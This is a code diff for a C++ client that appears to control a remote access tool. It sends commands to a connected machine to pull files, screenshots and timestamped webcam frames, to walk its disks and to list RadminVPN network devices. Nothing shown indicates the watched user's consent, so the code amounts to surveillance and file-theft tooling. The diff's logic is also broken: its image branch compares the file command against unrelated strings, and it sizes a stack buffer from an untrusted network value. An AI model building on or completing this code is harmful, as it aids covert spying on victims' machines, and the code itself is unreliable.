@@ -54,53 +54,105 @@ std::vector<char> receiveImageData(SOCKET clientSocket)
     return buffer;
 }
 
-bool openThatShit(std::string file_path)
+bool openThatShit(const std::string& file_path)
 {
     std::string cmd = "!get file " + file_path;
-    send(clientSocket, cmd.c_str(), cmd.size(), 0);
-    std::vector<char> receivedData;
 
-    // Receive file size
-    int fileSize;
-    if (recv(clientSocket, reinterpret_cast<char *>(&fileSize), sizeof(int), 0) <= 0)
+    send(clientSocket, cmd.c_str(), strlen(cmd.c_str()), 0);
+
+    std::vector<char> receivedData = {};
+    int bytesReceived = 0;
+    int expectedSize = 0;
+
+    // Handle image data for both screen capture and webcam
+    if (strcmp(cmd.c_str(), "!screenshot") == 0 || strcmp(cmd.c_str(), "!capture") == 0)
     {
-        std::cerr << "Failed to receive file size" << std::endl;
-        return false;
+        std::vector<char> imageData = receiveImageData(clientSocket);
+        if (!imageData.empty())
+        {
+            std::string filename;
+            if (strcmp(cmd.c_str(), "screen capture") == 0)
+            {
+                filename = "screenshot.jpg";
+            } else
+            {
+                // Create filename with timestamp for webcam frames
+                auto now = std::chrono::system_clock::now();
+                auto now_c = std::chrono::system_clock::to_time_t(now);
+                char timestamp[20];
+                strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now_c));
+                filename = "webcam_" + std::string(timestamp) + ".jpg";
+            }
+
+            std::ofstream outFile(filename, std::ios::binary);
+            outFile.write(imageData.data(), imageData.size());
+            outFile.close();
+            std::cout << "Image saved as " << filename << std::endl;
+        }
     }
 
-    // Receive file data
-    std::vector<char> fileBuffer(fileSize);
-    int totalReceived = 0;
-    while (totalReceived < fileSize)
+    if (file_path.size() > 4 && file_path.substr(file_path.size() - 4) == ".txt")
     {
-        int bytesReceived = recv(clientSocket, fileBuffer.data() + totalReceived,
-                                 fileSize - totalReceived, 0);
-        if (bytesReceived <= 0)
+        // Receive file size
+        int fileSize;
+        if (recv(clientSocket, reinterpret_cast<char *>(&fileSize), sizeof(int), 0) <= 0)
         {
-            std::cerr << "Failed to receive file data" << std::endl;
+            std::cerr << "Failed to receive file size" << std::endl;
             return false;
         }
-        totalReceived += bytesReceived;
+
+        // Receive file data
+        std::vector<char> fileBuffer(fileSize);
+        int totalReceived = 0;
+        while (totalReceived < fileSize)
+        {
+            bytesReceived = recv(clientSocket, fileBuffer.data() + totalReceived,
+                                 fileSize - totalReceived, 0);
+            if (bytesReceived <= 0)
+            {
+                std::cerr << "Failed to receive file data" << std::endl;
+                return false;
+            }
+            totalReceived += bytesReceived;
+        }
+        // Write to file
+        std::string tmp(cmd.c_str());
+        std::string outputPath = tmp.substr(tmp.find_last_of("\\") + 1);
+        std::ofstream outFile(outputPath, std::ios::binary);
+        if (!outFile) {
+            std::cerr << "Failed to create output file" << std::endl;
+            return false;
+        }
+
+        outFile.write(fileBuffer.data(), fileSize);
+        outFile.close();
+
+        std::cout << "File received and saved to: " << outputPath << std::endl;
     }
-    // Write to file
-    std::string tmp(cmd);
-    std::string outputPath = tmp.substr(tmp.find_last_of("\\") + 1);
-    std::ofstream outFile(outputPath, std::ios::binary);
-    if (!outFile) {
-        std::cerr << "Failed to create output file" << std::endl;
+
+
+    // Receive response msg from server
+    // First, receive the size of the response
+    bytesReceived = recv(clientSocket, (char *) &expectedSize, sizeof(int), 0);
+    if (bytesReceived != sizeof(int)) {
+        std::cerr << "Failed to receive response size" << std::endl;
         return false;
     }
 
-    outFile.write(fileBuffer.data(), fileSize);
-    outFile.close();
+    char recvBuffer[expectedSize];
+    // Now receive the actual response
+    while (receivedData.size() < expectedSize) {
+        bytesReceived = recv(clientSocket, recvBuffer, expectedSize, 0);
+        if (bytesReceived > 0) {
+            receivedData.insert(receivedData.end(), recvBuffer, recvBuffer + bytesReceived);
+        } else if (bytesReceived == 0) {
+            break;
+        } else {
+            break;
+        }
+    }
 
-
-    char working_directory[MAX_PATH];
-    GetCurrentDirectory(MAX_PATH, working_directory);
-    ShellExecuteA(nullptr, "open", "notepad.exe", outputPath.c_str(), working_directory, SW_SHOWNORMAL);
-    std::cout << "File received and saved to: " << outputPath << std::endl;
     return true;
-
 }
 
 void traverse(const std::string &disk)
@@ -216,8 +268,6 @@ int main()
         std::cout << "Enter your message: ";
         std::cin.getline(sendBuffer, 1024);
 
-
-        // List RadminVPN devices
         if (std::string(sendBuffer) == "list network")
         {
             NetworkDiscovery networkDiscovery;
@@ -229,10 +279,8 @@ int main()
         if (strstr(sendBuffer, "!traverse ") != NULL)
         {
             auto disk = std::string(sendBuffer + 10);
-            std::cout << disk << "\n";
             traverse(disk);
             std::cin.ignore();
-
             continue;
         }
 
@@ -246,8 +294,8 @@ int main()
 
         // Receive attachments from server
         // Receive response from server
-        std::vector<char> receivedData;
-        int bytesReceived;
+        std::vector<char> receivedData = {};
+        int bytesReceived = 0;
         int expectedSize = 0;
 
         // Handle image data for both screen capture and webcam
